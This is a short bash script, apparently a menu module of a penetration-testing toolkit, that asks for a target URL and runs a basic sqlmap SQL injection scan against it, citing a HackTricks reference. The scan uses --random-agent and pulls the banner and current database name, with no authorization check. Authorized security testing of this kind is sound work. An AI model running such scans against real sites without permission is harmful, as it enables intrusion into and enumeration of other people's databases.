#!/bin/bash
# HackTricks Ref: sql-injection
echo -e "${C6}[WEB ATTACK: INJECTION_SQLI]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection"
echo -e "--------------------------------------------------"

echo -ne "${C5}Enter Target URL: ${NC}"
read target_url

echo -e "\n${C4}[*] Running basic sqlmap scan...${NC}"
sqlmap -u "$target_url" --batch --banner --current-db --random-agent --level=1 --risk=1

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
